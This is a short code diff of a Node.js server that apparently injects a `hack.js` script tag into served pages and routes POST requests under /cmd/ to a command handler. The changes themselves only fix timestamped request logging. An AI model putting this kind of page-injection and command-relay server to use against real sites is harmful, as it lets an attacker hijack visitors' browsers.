@@ -5,10 +5,6 @@ const qs = require('querystring');
 const http = require('http');
 const finalhandler = require('finalhandler');
 const payload = '<script id="script1" type="text/javascript" src="hack.js"></script></head>';
-const date = new Date();
-let h = date.getHours();
-let minutes = date.getMinutes();
-let sec = date.getSeconds();
 let port = 80;
 let hostname = '127.0.0.1';
 let reset = "\x1b[0m", green = "\x1b[32m", red = "\x1b[31m", blue = "\x1b[34m", black = "\x1b[1m" + "\x1b[30m";
@@ -35,17 +31,18 @@ let roots = {
         if(req.method == 'POST'){
             let logfile = fs.createWriteStream('ServerLog.log', {
             flags: 'a'
-            })
-            var time = ('\n' + h + ':' + minutes + ':' + sec)
+        })
+            let date = new Date();
+            let time = ('\n' + date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds())
             console.log(black + "\n============================================");
             console.log(blue +  "Received post at url: ", green + req.url);
             console.log(blue +  "Agent Info: ", green, req.headers["user-agent"]);
             console.log(black + "============================================\n" + reset);
             //logfile
-            logfile.write(time + "============================================");
-            logfile.write(time + "Received post at url: ", green + req.url);
-            logfile.write(time + "Agent Info: ", green, req.headers["user-agent"]);
-            logfile.write(time + "============================================\n");
+            logfile.write(time + " ============================================");
+            logfile.write(time + " Received post at url: " + req.url);
+            logfile.write(time + " Agent Info: " + req.headers["user-agent"]);
+            logfile.write(time + " ============================================\n");
             if(req.url.startsWith('/cmd/')){
                 cliHandler(req, res);
             }else if (req.url.startsWith('/park/')){
